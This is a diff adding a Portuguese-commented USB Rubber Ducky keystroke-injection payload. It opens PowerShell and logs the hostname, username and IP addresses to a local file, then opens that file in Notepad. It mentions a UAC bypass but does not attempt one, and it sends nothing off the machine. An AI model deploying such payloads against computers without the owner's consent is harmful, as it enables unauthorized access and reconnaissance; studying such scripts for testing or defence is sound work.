@@ -1,0 +1,58 @@
+# Payload: Captura informações do sistema
+# Salva informações em arquivo de log
+# Funciona em Windows PowerShell
+
+DELAY 2000
+
+# Abre PowerShell como Admin (experimental - pode não funcionar sem UAC bypass)
+GUI r
+DELAY 500
+
+STRING powershell
+ENTER
+DELAY 1500
+
+# Cria arquivo com data/hora
+STRING $logfile = "$env:USERPROFILE\ducky_info.log"
+ENTER
+DELAY 300
+
+# Escreve timestamp
+STRING Add-Content $logfile "=== Ducky Payload Executado ==="
+ENTER
+DELAY 300
+
+STRING Add-Content $logfile (Get-Date)
+ENTER
+DELAY 300
+
+# Captura informações do sistema
+STRING Add-Content $logfile "--- Computador ---"
+ENTER
+DELAY 300
+
+STRING Add-Content $logfile (hostname)
+ENTER
+DELAY 300
+
+# Username
+STRING Add-Content $logfile "--- Usuário ---"
+ENTER
+DELAY 300
+
+STRING Add-Content $logfile $env:USERNAME
+ENTER
+DELAY 300
+
+# IP da máquina
+STRING Add-Content $logfile "--- IP ---"
+ENTER
+DELAY 300
+
+STRING Add-Content $logfile (ipconfig | Select-String IPv4)
+ENTER
+DELAY 1000
+
+# Mostra o arquivo criado
+STRING notepad $logfile
+ENTER
